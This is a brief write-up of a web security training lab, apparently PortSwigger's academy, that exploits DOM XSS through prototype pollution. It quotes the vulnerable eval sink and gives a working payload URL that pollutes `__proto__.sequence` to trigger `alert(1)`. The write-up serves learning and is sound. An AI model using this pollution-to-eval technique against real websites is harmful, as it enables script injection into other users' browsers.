# DOM XSS via an alternative prototype pollution vector
I guessed this lab looked like the former one. Therefore, I started by injecting `&__proto__[foo]=bar` which yielded nothing. However, `&__proto__.foo=bar` let me set a prototype property. 
While enumerating the javascript file that is being loaded in the main page, I found my sink. 
```js
window.macros = {};
window.manager = {params: $.parseParams(new URL(location)), macro(property) {
        if (window.macros.hasOwnProperty(property))
            return macros[property]
    }};
let a = manager.sequence || 1;
manager.sequence = a + 1;

eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');
```
manager.sequence is not being set - so we just need to set it to something that will give me an alert. This will give an alert: `alert(1));%20}//`
Therefore, full payload url is `https://0a5a00ca03c35bdc83dd6f6f00ad00ec.web-security-academy.net/?search=a&__proto__.sequence=alert(1));%20}//`